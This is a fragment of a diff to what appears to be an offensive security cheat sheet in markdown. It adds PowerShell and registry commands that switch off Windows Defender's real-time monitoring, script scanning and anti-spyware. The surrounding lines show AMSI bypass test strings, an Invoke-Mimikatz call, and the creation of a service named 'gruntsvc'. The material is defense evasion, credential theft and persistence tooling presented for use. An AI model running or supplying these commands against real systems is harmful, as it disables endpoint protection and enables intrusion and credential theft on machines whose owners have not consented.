@@ -35,6 +35,14 @@ Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
 Invoke-Mimikatz
 'amsiutils'
 ```
+```
+Get-MpComputerStatus
+Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -Force -MAPSReporting Disabled
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t reg_dword /d 1 /f
+
+reg query "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+```
+
 ## Create service
 ```
 New-Service -Name "gruntsvc" -BinaryPathName '"C:\WINDOWS\System32\svchost.exe -k netsvcs"'
